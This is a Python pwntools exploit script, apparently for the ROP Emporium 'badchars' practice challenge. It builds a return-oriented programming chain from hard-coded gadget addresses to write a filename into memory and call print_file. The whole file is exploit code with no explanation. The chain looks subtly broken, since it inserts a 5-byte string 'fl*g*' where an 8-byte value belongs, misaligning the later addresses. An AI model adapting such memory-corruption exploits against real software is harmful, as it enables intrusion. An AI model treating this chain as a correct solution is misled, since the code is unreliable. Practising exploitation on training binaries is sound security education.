from pwn import *
import sys
import time

context.arch="amd64"
context.kernel="amd64"
context.os="linux"


binary_name = "badchars"
e  = ELF(binary_name, checksec=True)
rop = ROP(binary_name)


context.binary = e


def main():
    if(len(sys.argv) <2):
        print("Running locally")
        p = process(f"./{binary_name}")
    elif(sys.argv[1] == "gdb"):
        p = gdb.debug(f"./{binary_name}", gdbscript="b *0x4008F1", aslr=False)
    else:
        p = process(f"./{binary_name}")

    # Functions
    ret = p64(0x4004ee)
    print_file = e.plt['print_file']
    pop_r12_r13_pad2 = p64(0x40069c)
    arb_write = p64(0x400634)
    pop_rdi = p64(0x4006a3)

    write_addr = p64(0x601029)

    payload = b"A" *40
    payload+= ret+ pop_r12_r13_pad2 + b"fl*g*"+write_addr+ p64(0xdeadbeefdeadbeef) *2+arb_write  # write 

    payload+= pop_rdi + write_addr 

    payload+=p64(print_file)

    p.sendline(payload)
    p.interactive()

main()
